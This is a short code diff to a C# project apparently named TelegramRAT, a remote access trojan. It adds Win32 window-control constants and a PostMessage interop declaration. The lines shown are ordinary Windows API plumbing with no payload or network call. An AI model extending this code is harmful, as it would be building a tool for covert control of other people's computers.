@@ -85,6 +85,10 @@ namespace TelegramRAT
         public const int SPIF_UPDATEINIFILE = 0x01;
         public const int SPIF_SENDWININICHANGE = 0x02;
 
+        public const int WM_SYSCOMMAND = 0x0112;
+        public const int SC_MINIMIZE = 0xF020;
+        public const int SC_MAXIMIZE = 0xF030;
+        public const int SC_RESTORE = 0xF120;
 
         [DllImport(u32, EntryPoint = "CloseWindow")]
         public static extern bool MinimizeWindow(IntPtr handle);
@@ -97,6 +101,9 @@ namespace TelegramRAT
 
         [DllImport(u32, EntryPoint = "MapVirtualKeyA")]
         public static extern char MapVirtualKey(uint keyCode, uint mapType = 2);
+
+        [DllImport(u32, EntryPoint = "PostMessageA")]
+        public static extern bool PostMessage(IntPtr hWnd, int msg, int wParam, int lParam);
         
 
     }
